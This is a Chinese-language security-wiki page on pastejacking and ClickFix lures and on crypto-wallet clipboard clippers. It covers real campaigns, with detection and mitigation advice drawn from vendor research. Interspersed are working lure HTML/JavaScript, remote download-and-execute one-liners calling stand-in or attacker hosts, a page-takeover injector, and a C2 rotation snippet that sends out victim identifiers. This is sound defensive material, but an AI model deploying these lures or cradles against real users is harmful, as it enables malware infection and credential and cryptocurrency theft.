# Clipboard Hijacking (Pastejacking) 攻击

{{#include ../../banners/hacktricks-training.md}}

> “不要粘贴任何不是你自己复制的内容。”——这条建议虽旧，但依然有效

## 概述

Clipboard hijacking（也称为 *pastejacking*）利用了用户经常不检查内容就复制并粘贴命令这一习惯。恶意网页（或任何支持 JavaScript 的环境，例如 Electron 或 Desktop 应用程序）会通过程序将攻击者控制的文本放入系统剪贴板。攻击者通常会精心设计社会工程学指引，诱导受害者按下 **Win + R**（运行对话框）、**Win + X**（快捷访问 / PowerShell），或打开终端并 *粘贴*剪贴板内容，从而立即执行任意命令。

由于**没有下载文件，也没有打开附件**，这种技术绕过了大多数用于监控附件、宏或直接命令执行的电子邮件和 Web 内容安全控制。因此，攻击者常在钓鱼活动中使用这种方式投递 NetSupport RAT、Latrodectus loader 或 Lumma Stealer 等常见恶意软件家族。<sup>[[1]](#references)</sup>

## 钱包地址替换型 clipper

另一种 **clipboard hijacking** 变体不会粘贴命令，而是等待受害者复制**加密货币钱包地址**，然后在粘贴前悄悄将其替换为攻击者控制的地址。由于钱包地址通常很长，用户往往只核对开头和结尾的字符，因此这种方式尤其有效。<sup>[[8]](#references)</sup>

常见的真实案例特征：
- **轻量 loader + 嵌套 payload**：表面上的应用程序或可执行文件看起来像合法的交易或“盈利”工具，而真正的 clipper 则隐藏在程序包更深处（例如，由 .NET loader 启动嵌套的 Rust payload）。
- **基于 Regex 的替换**：恶意软件会匹配 `bc1...`、`1...`、`3...`、`0x...`、`addr1...`、`DdzFF...`、`ltc...`、`T...`、`r...` 等字符串，甚至通用的 **44 字符、类似 Solana 地址的**字符串，并将其改写为攻击者的钱包地址。
- **大规模轮换钱包地址**：现代 Windows 样本可能会为每种货币内置**数千个**替换钱包地址，而不是使用单个静态地址，从而减少每次盗窃后钱包信誉受损的影响。<sup>[[8]](#references)</sup>

### Windows clipper 工作流程

一种常见实现方式是注册了 **`AddClipboardFormatListener`** 的隐藏窗口。每当剪贴板更新时，恶意软件通常会调用：<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → 访问当前剪贴板数据。
- **`GetClipboardData`** → 读取文本。
- **`EmptyClipboard`** + **`SetClipboardData`** → 将钱包字符串替换为攻击者的地址。

clipper 中常见的基础 hunting regex：

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

用户级持久化足以造成影响。一种观察到的模式是：<sup>[[8]](#references)</sup>
- 将 payload 复制到 **`%APPDATA%\silke\silke.exe`**
- 在 `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` 下创建 **Startup 文件夹 LNK**

检测思路：
- 持续调用 clipboard API，同时在 `%APPDATA%` 和用户的 **Startup** 文件夹下写入内容的进程。
- 创建新的 LNK/可执行文件后，紧接着重写钱包地址剪贴板内容。
- 包含大量未使用文件、以及一个用于启动嵌套二进制文件的小型启动器的压缩包或伪造软件包。

### macOS 社会工程式移除 quarantine + LaunchAgent 持久化

在 macOS 上，有些攻击活动会提供一个 **`unlocker.command`** 辅助程序，并指示受害者在 Gatekeeper 提示应用已损坏或来自身份不明的开发者时，右键点击 → **打开**。该脚本只会移除 quarantine 并启动旁边的 `.app`：<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

这**不是** Gatekeeper exploit；这是一个**通过社会工程实施的 quarantine 绕过**，利用了 Gatekeeper 的判定取决于 `com.apple.quarantine` xattr 这一事实。<sup>[[8]](#references)</sup>

执行后，clipper 可以通过写入以下文件，以当前用户身份持久化：<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – 包含 `RunAtLoad` 和 `KeepAlive` 的 LaunchAgent

一个有用的防御细节是，某些样本会实现**自修复 watchdog**，每隔约 30 秒重新写入 LaunchAgent 和 wrapper。如果先删除 plist，**却没有终止正在运行的进程**，malware 可能会立即重新创建它。<sup>[[8]](#references)</sup> 安全清理顺序：
1. 终止活跃的 clipper 进程。
2. 卸载并删除 LaunchAgent plist。
3. 删除 `~/launch.sh` 和复制的 payload。

### 投递说明：虚假口碑的倍增效应

对于这一家族，malware 本身在技术上可以保持简单，而**分发层**负责大部分工作：虚假的 GitHub stars/forks、SourceForge 评论/下载、YouTube 教程评论/观看量，以及看似无害的 VirusTotal 评论/投票，都会在执行前让二进制文件显得可信。<sup>[[8]](#references)</sup>

## 强制使用 Copy 按钮与隐藏 payload（macOS 单行命令）

某些 macOS infostealer 会克隆安装程序网站（例如 Homebrew），并**强制用户使用“Copy”按钮**，使用户无法只选中可见文本。剪贴板内容包含预期的安装程序命令，后面还附加了一个 Base64 payload（例如 `...; echo <b64> | base64 -d | sh`），因此一次粘贴就会同时执行两者，而 UI 会隐藏额外的阶段。<sup>[[5]](#references)</sup>

## JavaScript 概念验证

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

较早的 campaigns 使用 `document.execCommand('copy')`，较新的 campaigns 则依赖异步 **Clipboard API**（`navigator.clipboard.writeText`）。<sup>[[2]](#references)</sup>

## ClickFix / ClearFake 流程

1. 用户访问 typo-squatted 或遭入侵的网站（例如 `docusign.sa[.]com`）
2. 注入的 **ClearFake** JavaScript 调用 `unsecuredCopyToClipboard()` helper，在剪贴板中静默存储一个 Base64 编码的 PowerShell 单行命令。
3. HTML 指示受害者：*“按 **Win + R**，粘贴命令并按 Enter 键来解决问题。”*
4. `powershell.exe` 执行，下载一个包含合法可执行文件和恶意 DLL 的 archive（经典 DLL sideloading）。
5. loader 解密后续 stages，注入 shellcode 并安装持久化机制（例如 scheduled task），最终运行 NetSupport RAT / Latrodectus / Lumma Stealer。<sup>[[1]](#references)</sup>

### NetSupport RAT 示例链路

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe`（合法的 Java WebStart）会在其目录中查找 `msvcp140.dll`。
* 恶意 DLL 使用 **GetProcAddress** 动态解析 API，通过 **curl.exe** 下载两个二进制文件（`data_3.bin`、`data_4.bin`），使用滚动 XOR 密钥 `"https://google.com/"` 解密它们，注入最终的 shellcode，并将 **client32.exe**（NetSupport RAT）解压到 `C:\ProgramData\SecurityCheck_v1\`。<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. 使用 **curl.exe** 下载 `la.txt`
2. 在 **cscript.exe** 中执行 JScript downloader
3. 获取 MSI payload → 将 `libcef.dll` 放在已签名应用程序旁 → DLL sideloading → shellcode → Latrodectus。<sup>[[1]](#references)</sup>

### 通过 MSHTA 使用 Lumma Stealer

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta** 调用会启动一个隐藏的 PowerShell 脚本，该脚本会获取 `PartyContinued.exe`，提取 `Boat.pst`（CAB），通过 `extrac32` 和文件拼接重建 `AutoIt3.exe`，最后运行一个将浏览器凭据外传至 `sumeriavgv.digital` 的 `.a3x` 脚本。<sup>[[1]](#references)</sup>

## ClickFix：剪贴板 → PowerShell → JS eval → 带轮换 C2 的 Startup LNK（PureHVNC）

有些 ClickFix 活动完全跳过文件下载，转而诱使受害者粘贴一行命令，通过 WSH 获取并执行 JavaScript、建立持久化，并每日轮换 C2。观察到的示例攻击链：<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

关键特征
- 混淆后的 URL 在运行时反转，以避免被随意检查发现。
- JavaScript 通过 Startup LNK（WScript/CScript）实现持久化，并根据当天选择 C2，从而实现域名快速轮换。<sup>[[3]](#references)</sup>

用于按日期轮换 C2 的最简 JS 片段：<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

下一阶段通常会部署一个 loader 来建立持久化并拉取 RAT（例如 PureHVNC），该 loader 通常会将 TLS 固定到硬编码证书，并对流量进行分块。<sup>[[3]](#references)</sup>

此变种的检测思路
- 进程树：`explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js`（或 `cscript.exe`）。
- 启动项工件：`%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` 中的 LNK，调用 WScript/CScript 并传入 `%TEMP%`/`%APPDATA%` 下的 JS 路径。
- 注册表/RunMRU 和命令行遥测中包含 `.split('').reverse().join('')` 或 `eval(a.responseText)`。
- 重复出现 `powershell -NoProfile -NonInteractive -Command -`，并带有较大的 stdin 载荷，以便在不使用超长命令行的情况下传入长脚本。
- Scheduled Tasks 随后执行 LOLBins，例如在看起来像更新程序的任务/路径下运行 `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`（例如 `\GoogleSystem\GoogleUpdater`）。

威胁狩猎
- 每日轮换的 C2 主机名和 URL，模式为 `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`。
- 关联剪贴板写入事件与随后通过 Win+R 粘贴并立即执行 `powershell.exe` 的行为。

蓝队可以结合剪贴板、进程创建和注册表遥测，精准定位 pastejacking 滥用：

* Windows Registry：`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` 会保存 **Win + R** 命令历史记录——检查异常的 Base64 / 混淆条目。
* 安全事件 ID **4688**（进程创建）：`ParentImage` == `explorer.exe` 且 `NewProcessName` 属于 { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }。
* 事件 ID **4663**：在可疑的 4688 事件发生前，检查 `%LocalAppData%\Microsoft\Windows\WinX\` 或临时文件夹下的文件创建事件。
* EDR 剪贴板传感器（如果有）——关联 `Clipboard Write` 与紧接着启动的新 PowerShell 进程。

## IUAM 风格验证页面（ClickFix Generator）：复制到剪贴板后粘贴到控制台 + 感知操作系统的载荷

近期的活动会批量生成伪造的 CDN/浏览器验证页面（“Just a moment…”，IUAM 风格），诱使用户从剪贴板复制针对操作系统定制的命令，并粘贴到原生控制台中执行。这样会将执行过程移出浏览器沙箱，并同时适用于 Windows 和 macOS。<sup>[[4]](#references)</sup>

构建器生成页面的主要特征
- 通过 `navigator.userAgent` 检测操作系统，以定制载荷（Windows PowerShell/CMD 或 macOS Terminal）。可为不支持的操作系统提供伪装内容/空操作，以维持假象。
- 用户进行无害的 UI 操作（勾选复选框/点击 Copy）时自动复制到剪贴板，而可见文本可能与剪贴板内容不同。
- 阻止移动设备，并通过弹出框提供分步说明：Windows → Win+R→粘贴→Enter；macOS → 打开 Terminal→粘贴→Enter。
- 可选的混淆和单文件注入器，用 Tailwind 风格的验证 UI 覆盖被入侵网站的 DOM（无需注册新域名）。<sup>[[4]](#references)</sup>

示例：剪贴板内容不匹配 + 感知操作系统的分支逻辑
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS 首次运行时的持久化
- 使用 `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &`，使执行在终端关闭后继续运行，从而减少可见痕迹。<sup>[[4]](#references)</sup>

在遭入侵的网站上原地接管页面
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

针对 IUAM 风格诱饵的检测与狩猎思路
- Web：将 Clipboard API 绑定到验证组件的页面；显示文本与剪贴板内容不一致；根据 `navigator.userAgent` 进行分支处理；在可疑场景中使用 Tailwind + 单页替换。
- Windows 终端：浏览器交互后不久出现 `explorer.exe` → `powershell.exe`/`cmd.exe`；从 `%TEMP%` 执行 batch/MSI 安装程序。
- macOS 终端：浏览器事件附近，Terminal/iTerm 启动带有 `nohup` 的 `bash`/`curl`/`base64 -d`；关闭终端后后台任务仍继续运行。
- 关联 `RunMRU` Win+R 历史记录和剪贴板写入，与随后创建的控制台进程。

另请参阅相关技术

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix 演变（ClearFake、Scarlet Goldfinch）

- ClearFake 持续入侵 WordPress 网站，并注入串联外部主机（Cloudflare Workers、GitHub/jsDelivr）的 loader JavaScript，甚至调用区块链“etherhiding”（例如向 Binance Smart Chain API 端点 `bsc-testnet.drpc[.]org` 发送 POST 请求），以获取最新的诱饵逻辑。近期的覆盖层大量使用 fake CAPTCHA，指示用户复制/粘贴一行命令（T1204.004），而不是下载任何内容。<sup>[[6]](#references)</sup>
- 初始执行越来越多地交由签名脚本宿主/LOLBAS 处理。2026 年 1 月的攻击链将先前使用的 `mshta` 替换为通过 `WScript.exe` 执行内置的 `SyncAppvPublishingServer.vbs`，并传入类似 PowerShell 的参数及别名/通配符来获取远程内容：<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` 已签名，通常由 App-V 使用；与 `WScript.exe` 及异常参数（`gal`/`gcm` 别名、通配符 cmdlets、jsDelivr URLs）搭配时，会成为 ClearFake 的高信号 LOLBAS 阶段。<sup>[[6]](#references)</sup>
- 2026 年 2 月的假 CAPTCHA payload 又转向纯 PowerShell 下载 cradle。两个仍在运行的示例：<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - 第一条链是一个内存中的 `iex(irm ...)` 下载器；第二条通过 `WinHttp.WinHttpRequest.5.1` 暂存，写入临时 `.ps1`，然后在隐藏窗口中使用 `-ep bypass` 启动。<sup>[[6]](#references)</sup>

这些变体的检测/狩猎提示
- 进程链：浏览器 → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs`，或在剪贴板写入/Win+R 操作后立即执行 PowerShell cradles。
- 命令行关键词：`SyncAppvPublishingServer.vbs`、`WinHttp.WinHttpRequest.5.1`、`-UseBasicParsing`、`%TEMP%\FVL.ps1`、jsDelivr/GitHub/Cloudflare Worker 域名，或原始 IP `iex(irm ...)` 模式。
- 网络：浏览网页后不久，脚本宿主/PowerShell 向 CDN Worker 主机或区块链 RPC 端点发起出站连接。
- 文件/注册表：在 `%TEMP%` 下创建临时 `.ps1`，并在 RunMRU 项中留下包含这些单行命令的记录；阻止/警报带外部 URL 或混淆别名字符串运行的签名脚本 LOLBAS（WScript/cscript/mshta）。

## 2026 年 6 月 ClickFix 技术手法：粘贴遥测、伪造验证注释与 LOLBin 链式调用

Red Canary 最近的遥测表明，稳定的指标**不是某一条确切命令**，而是**用户协助的粘贴并运行**、**受信任的解释器/LOLBins**、**混淆标志**、**远程获取**和**立即执行**这些行为的组合。<sup>[[7]](#references)</sup>

### 值得注意的操作者模式

- **粘贴确认遥测**：某些 payload 会在真正的阶段执行前调用 `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted`。这能在保持操作时间短且低调的同时确认用户交互。
- **伪造验证注释**：PowerShell 单行命令可能会附加诸如 `# Security check ✔️ I'm not a robot Verification ID: 138105` 的字符串，这样命令粘贴到 Run / `cmd.exe` / PowerShell 历史记录后，仍看起来像是与 CAPTCHA 相关。
- **动态 URL 重构**：`iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` 避免在命令行中出现静态 URL，同时仍能在内存中下载并执行。
- **伪装安装程序执行**：`"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` 利用标志中的异常大小写和类似 Unicode 的字符绕过脆弱的检测，同时仍伪装成 `msiexec.exe`。
- **插入脱字符转义的 LOLBin 链**：`cmd.exe` 可以用 `^` 转义隐藏关键词（`s^t^a^r^t`、`^c^u^r^l^`、`^m^s^h^t^a^`），以最小化窗口启动嵌套 shell，使用 `.pdf` 等无害扩展名保存攻击者内容，然后通过 `mshta` 执行。<sup>[[7]](#references)</sup>
## 缓解措施

1. 加固浏览器——禁用剪贴板写入权限（`dom.events.asyncClipboard.clipboardItem` 等）或要求用户手势。
2. 安全意识培训——教导用户*手动输入*敏感命令，或先将其粘贴到文本编辑器中。
3. 使用 PowerShell Constrained Language Mode / Execution Policy 和应用程序控制，阻止任意单行命令。
4. 网络控制——阻止向已知的 pastejacking 和恶意软件 C2 域名发起出站请求。

## 相关技巧

* **Discord 邀请劫持**常在诱骗用户加入恶意服务器后，滥用同一种 ClickFix 手法：
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [修复 Click：防止 ClickFix 攻击向量](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – 在 Pure Curtain 之下：从 RAT 到构建器再到编码者](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix 工厂：首次揭露 IUAM ClickFix 生成器](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025：信息窃取程序之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – 情报洞察：2026 年 2 月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – 情报洞察：2026 年 6 月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – 从星标到点赞：虚假声誉助长加密货币剪贴板劫持程序](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
